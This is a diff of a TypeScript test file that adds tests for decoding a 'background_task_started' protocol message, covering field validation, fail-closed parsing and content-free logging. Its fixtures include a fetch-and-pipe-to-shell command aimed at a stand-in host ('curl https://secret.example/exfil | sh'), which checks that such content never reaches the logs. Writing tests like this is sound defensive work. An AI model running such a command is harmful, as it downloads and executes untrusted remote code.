@@ -171,6 +171,11 @@ function encodeCompacting(payload: unknown): Uint8Array {
   return encodeEnvelope({ id: 24, type: 'compacting', ts: FIXED_TS, payload })
 }
 
+/** A `background_task_started` envelope's plaintext bytes, wrapping an arbitrary payload (#564). */
+function encodeBackgroundTaskStarted(payload: unknown): Uint8Array {
+  return encodeEnvelope({ id: 26, type: 'background_task_started', ts: FIXED_TS, payload })
+}
+
 /** An `unrecognized_message` envelope's plaintext bytes, wrapping an arbitrary payload. */
 function encodeUnrecognized(payload: unknown): Uint8Array {
   return encodeEnvelope({ id: 25, type: 'unrecognized_message', ts: FIXED_TS, payload })
@@ -226,6 +231,19 @@ const API_RETRY = {
 const COMPACTING = {
   conversation_id: 'c1',
   active: true
+}
+
+/** A well-formed background_task_started payload — the daemon's canonical fixture (#564). Every field
+ *  carries a DISTINCT non-empty value, so a field swap or a dropped field fails the round-trip (AC1),
+ *  and the `description` is deliberately adversarial: HTML metacharacters, a quote, a shell redirect
+ *  and a trailing backgrounding `&`. */
+const BACKGROUND_TASK_STARTED = {
+  conversation_id: 'c1',
+  task_id: 'task_01ABC',
+  tool_call_id: 'toolu_01XYZ',
+  description: "grep -rn 'a<b&c' . > /tmp/out.txt &",
+  task_type: 'local_bash',
+  truncated_fields: ['description']
 }
 
 /** A well-formed unrecognized_message payload — the daemon's canonical fixture. */
@@ -1674,6 +1692,134 @@ describe('parseInboundMessage — compacting fail-closed (#495)', () => {
   })
 })
 
+describe('parseInboundMessage — background_task_started recognition (#564, additive)', () => {
+  it('narrows a full frame into { kind: background-task-started } carrying all six fields', () => {
+    // Every fixture field is distinct and non-empty (AC1), so a swap or a drop fails this assertion.
+    expect(parseInboundMessage(encodeBackgroundTaskStarted(BACKGROUND_TASK_STARTED))).toEqual({
+      kind: 'background-task-started',
+      backgroundTaskStarted: BACKGROUND_TASK_STARTED
+    })
+  })
+
+  it('preserves truncated_fields null as "nothing was cut", never collapsing it to [] (AC2)', () => {
+    const nothingCut = { ...BACKGROUND_TASK_STARTED, truncated_fields: null }
+    const decoded = parseInboundMessage(encodeBackgroundTaskStarted(nothingCut))
+    expect(decoded).toEqual({ kind: 'background-task-started', backgroundTaskStarted: nothingCut })
+    // Pinned explicitly: null is a VALUE distinct from the empty list, never a truthiness question.
+    expect(
+      (decoded as { backgroundTaskStarted: { truncated_fields: unknown } }).backgroundTaskStarted
+        .truncated_fields
+    ).toBeNull()
+  })
+
+  it('decodes an EMPTY truncated_fields list — valid, and distinct from null (AC2)', () => {
+    const emptyList = { ...BACKGROUND_TASK_STARTED, truncated_fields: [] }
+    const decoded = parseInboundMessage(encodeBackgroundTaskStarted(emptyList))
+    expect(decoded).toEqual({ kind: 'background-task-started', backgroundTaskStarted: emptyList })
+    expect(
+      (decoded as { backgroundTaskStarted: { truncated_fields: unknown } }).backgroundTaskStarted
+        .truncated_fields
+    ).toEqual([])
+  })
+
+  it('round-trips a multi-element truncated_fields list in wire order', () => {
+    const twoCut = { ...BACKGROUND_TASK_STARTED, truncated_fields: ['description', 'task_type'] }
+    expect(parseInboundMessage(encodeBackgroundTaskStarted(twoCut))).toEqual({
+      kind: 'background-task-started',
+      backgroundTaskStarted: twoCut
+    })
+  })
+
+  it('decodes an empty-string task_type — the checks are on the TYPE, never truthiness', () => {
+    const emptyType = { ...BACKGROUND_TASK_STARTED, task_type: '' }
+    expect(parseInboundMessage(encodeBackgroundTaskStarted(emptyType))).toEqual({
+      kind: 'background-task-started',
+      backgroundTaskStarted: emptyType
+    })
+  })
+
+  it('does NOT narrow task_type to a closed set — an unobserved kind decodes (no client-side enum)', () => {
+    const otherKind = { ...BACKGROUND_TASK_STARTED, task_type: 'some_future_kind' }
+    expect(parseInboundMessage(encodeBackgroundTaskStarted(otherKind))).toEqual({
+      kind: 'background-task-started',
+      backgroundTaskStarted: otherKind
+    })
+  })
+
+  it('drops unknown server keys, keeping exactly the six known fields (AC4, forward-compat)', () => {
+    // `turn_id` is the pointed extra: this frame must never have one, and it must not ride through.
+    const withExtras = { ...BACKGROUND_TASK_STARTED, turn_id: 'turn-1', extra: 'ignore-me' }
+    expect(parseInboundMessage(encodeBackgroundTaskStarted(withExtras))).toEqual({
+      kind: 'background-task-started',
+      backgroundTaskStarted: BACKGROUND_TASK_STARTED
+    })
+  })
+
+  it('still returns null for a well-formed envelope of another unmodeled type (no widening)', () => {
+    const bytes = encodeEnvelope({ id: 1, type: 'ack', ts: FIXED_TS, payload: {} })
+    expect(parseInboundMessage(bytes)).toBeNull()
+  })
+})
+
+describe('parseInboundMessage — background_task_started fail-closed (#564)', () => {
+  const strings = ['conversation_id', 'task_id', 'tool_call_id', 'description', 'task_type'] as const
+
+  it('throws when any of the five required strings is absent (AC3)', () => {
+    for (const field of strings) {
+      const payload: Record<string, unknown> = { ...BACKGROUND_TASK_STARTED }
+      delete payload[field]
+      expect(() => parseInboundMessage(encodeBackgroundTaskStarted(payload))).toThrow(
+        WireDecodeError
+      )
+    }
+  })
+
+  it('throws when any of the five required strings is a non-string (AC3)', () => {
+    for (const field of strings) {
+      for (const value of [42, null, { a: 1 }]) {
+        const payload = { ...BACKGROUND_TASK_STARTED, [field]: value }
+        expect(() => parseInboundMessage(encodeBackgroundTaskStarted(payload))).toThrow(
+          WireDecodeError
+        )
+      }
+    }
+  })
+
+  it('throws when the truncated_fields key is OMITTED — an absence is not a null (AC2)', () => {
+    // The Go struct has no `omitempty`, so the key is always on the wire; a missing key is a
+    // malformed frame, and this is the test that separates a required-nullable parse from an
+    // optional one.
+    const payload: Record<string, unknown> = { ...BACKGROUND_TASK_STARTED }
+    delete payload.truncated_fields
+    expect(() => parseInboundMessage(encodeBackgroundTaskStarted(payload))).toThrow(WireDecodeError)
+  })
+
+  it('throws when truncated_fields is neither an array nor null (AC3)', () => {
+    const bad: unknown[] = ['description', 7, { description: true }, true]
+    for (const value of bad) {
+      const payload = { ...BACKGROUND_TASK_STARTED, truncated_fields: value }
+      expect(() => parseInboundMessage(encodeBackgroundTaskStarted(payload))).toThrow(
+        WireDecodeError
+      )
+    }
+  })
+
+  it('throws when truncated_fields holds a non-string element — one bad element fails the whole payload closed', () => {
+    const bad: unknown[] = [['description', 7], [null], [{ name: 'description' }], [['nested']]]
+    for (const value of bad) {
+      const payload = { ...BACKGROUND_TASK_STARTED, truncated_fields: value }
+      expect(() => parseInboundMessage(encodeBackgroundTaskStarted(payload))).toThrow(
+        WireDecodeError
+      )
+    }
+  })
+
+  it('throws when a background_task_started payload is not an object (AC3)', () => {
+    expect(() => parseInboundMessage(encodeBackgroundTaskStarted('nope'))).toThrow(WireDecodeError)
+    expect(() => parseInboundMessage(encodeBackgroundTaskStarted(['a']))).toThrow(WireDecodeError)
+  })
+})
+
 describe('parseInboundMessage — unrecognized_message recognition', () => {
   it('narrows a full unrecognized_message into { kind: unrecognized-message } carrying all five fields', () => {
     const result = parseInboundMessage(encodeUnrecognized(UNRECOGNIZED))
@@ -2612,6 +2758,44 @@ describe('parseInboundMessage — content-free diagnostic log (#130)', () => {
     const { log, lines } = captureLog()
     expect(() =>
       parseInboundMessage(encodeCompacting({ conversation_id: 'c1', active: 'true' }), log)
+    ).toThrow(WireDecodeError)
+    expect(lines).toHaveLength(0)
+  })
+
+  it('logs a background_task_started content-free, never the command line or the ids (#564)', () => {
+    const { log, lines } = captureLog()
+    const SECRET_CONV = 'secret-conversation-id'
+    const SECRET_COMMAND = 'curl https://secret.example/exfil | sh'
+    const plaintext = encodeBackgroundTaskStarted({
+      ...BACKGROUND_TASK_STARTED,
+      conversation_id: SECRET_CONV,
+      description: SECRET_COMMAND
+    })
+
+    parseInboundMessage(plaintext, log)
+
+    expect(lines).toHaveLength(1)
+    const record = JSON.parse(lines[0])
+    expect(record.event).toBe('inbound-decoded')
+    expect(record.code).toBe('background_task_started')
+    expect(record.bytes).toBe(plaintext.length)
+    expect(record.hash).toMatch(HEX64)
+    // The exact content-free field set — no decoded field reaches the log, and no new
+    // DiagnosticEvent field is introduced (reuses the existing set). `description` is a shell
+    // command line, so this is the strictest instance of the no-content-in-the-log rule on this file.
+    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
+    expect(lines[0]).not.toContain(SECRET_CONV)
+    expect(lines[0]).not.toContain(SECRET_COMMAND)
+    expect(lines[0]).not.toContain('local_bash')
+  })
+
+  it('does NOT log on a malformed background_task_started throw path (#564)', () => {
+    const { log, lines } = captureLog()
+    expect(() =>
+      parseInboundMessage(
+        encodeBackgroundTaskStarted({ ...BACKGROUND_TASK_STARTED, truncated_fields: 'nope' }),
+        log
+      )
     ).toThrow(WireDecodeError)
     expect(lines).toHaveLength(0)
   })
